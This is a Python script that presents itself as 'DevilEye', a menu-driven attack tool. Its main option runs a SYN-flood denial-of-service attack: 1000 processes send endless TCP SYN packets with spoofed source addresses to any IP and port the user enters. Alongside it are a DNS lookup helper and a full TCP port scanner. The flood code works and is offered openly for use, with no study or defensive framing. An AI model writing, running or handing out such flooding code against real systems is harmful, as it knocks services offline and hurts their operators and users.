import sys
from colorama import Fore, init
from scapy.all import *
import random
import time
from multiprocessing import Process
from scapy.layers.inet import TCP
from scapy.layers.inet import IP
import socket


# Define ASCII Eye display function
def display_ascii_eye():
    ascii_eye = f"""
                            {Fore.LIGHTGREEN_EX}...',;;:cccccccc:;,..
                        ..,;:cccc::::ccccclloooolc;'..
                     .',;:::;;;;:loodxk0kkxxkxxdocccc;;'..
                   .,;;;,,;:coxldKNWWWMMMMWNNWWNNKkdolcccc:,.
                .',;;,',;lxo:...dXWMMMMMMMMNkloOXNNNX0koc:coo;.
             ..,;:;,,,:ldl'   .kWMMMWXXNWMMMMXd..':d0XWWN0d:;lkd,
           ..,;;,,'':loc.     lKMMMNl. .c0KNWNK:  ..';lx00X0l,cxo,.
         ..''....'cooc.       c0NMMX;   .l0XWN0;       ,ddx00occl:.
       ..'..  .':odc.         .x0KKKkolcld000xc.       .cxxxkkdl:,..
     ..''..   ;dxolc;'         .lxx000kkxx00kc.      .;looolllol:'..
    ..'..    .':lloolc:,..       'lxkkkkk0kd,   ..':clc:::;,,;:;,'..
    ......   ....',;;;:ccc::;;,''',:loddol:,,;:clllolc:;;,'........
        .     ....'''',,,;;:cccccclllloooollllccc:c:::;,'..
                .......'',,,,,,,,;;::::ccccc::::;;;,,''...
                  ...............''',,,;;;,,''''''......
                     ............................
    """
    print(ascii_eye)


# DDoS attack function
def send_packet(target_ip, target_port):
    while True:
        src_ip = f"192.168.1.{random.randint(1, 254)}"
        packets = IP(src=src_ip, dst=target_ip) / TCP(dport=target_port, flags="S")
        send(packets, verbose=0)
        time.sleep(0.01)

# Simulate DDoS with processes
def simulate_ddos(target_ip, target_port):
    processes = []
    for _ in range(1000):  # Adjust number of processes
        p = Process(target=send_packet, args=(target_ip, target_port))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()

# NSLOOKUP function
def nslookup(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(Fore.LIGHTGREEN_EX + f"The IP address of {domain} is {ip}")
    except socket.gaierror:
        print(Fore.LIGHTGREEN_EX +  f"Could not resolve domain {domain}")


# Port Scanning function
def port_scanning(target_ip):
    print(Fore.LIGHTGREEN_EX +  f"Scanning ports for {target_ip}...")
    for port in range(1, 65535):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((target_ip, port))
        if result == 0:
            print(Fore.LIGHTGREEN_EX +  f"Port {port} is open.")
        sock.close()


# Main loop for options
def main():
    while True:
        display_ascii_eye()
        banner2 = Fore.LIGHTWHITE_EX + ("---------------------------------------------\n" +
                                        "Welcome to ") + Fore.LIGHTGREEN_EX + "DevilEye\n" + Fore.LIGHTWHITE_EX + \
                  "---------------------------------------------"

        print(banner2)
        options = input(Fore.LIGHTGREEN_EX + "1. DDos\n"
                        "2. nslookup\n"
                        "3. Port Scanning\n"
                        "Please select option>>")
        if options == "1":
            question1 = input(Fore.LIGHTWHITE_EX + "-------------------------\n"+ Fore.LIGHTGREEN_EX +
                              "Enter target IP (e.g., 127.0.0.1):")
            question2 = input("Enter target port (e.g., 80): ")
            try:
                target_ip = question1
                target_port = int(question2)  # Cast port to int

                print("----------------------\n"
                      "Starting DDoS attack...\n"
                      "----------------------\n"
                      "Ctrl + C To Stop Attack\n"
                      "----------------------")
                simulate_ddos(target_ip, target_port)

            except ValueError:
                print(Fore.LIGHTRED_EX +  "Invalid input. Please enter a valid IP address and port.")
            except KeyboardInterrupt:
                print(Fore.LIGHTRED_EX + "\nStopped by user.")

        elif options == "2":
            domain = input("Enter domain for NSLOOKUP: ")
            nslookup(domain)

        elif options == "3":
            target_ip = input("Enter IP for Port Scanning (e.g., 192.168.1.1): ")
            port_scanning(target_ip)


if __name__ == "__main__":
    main()
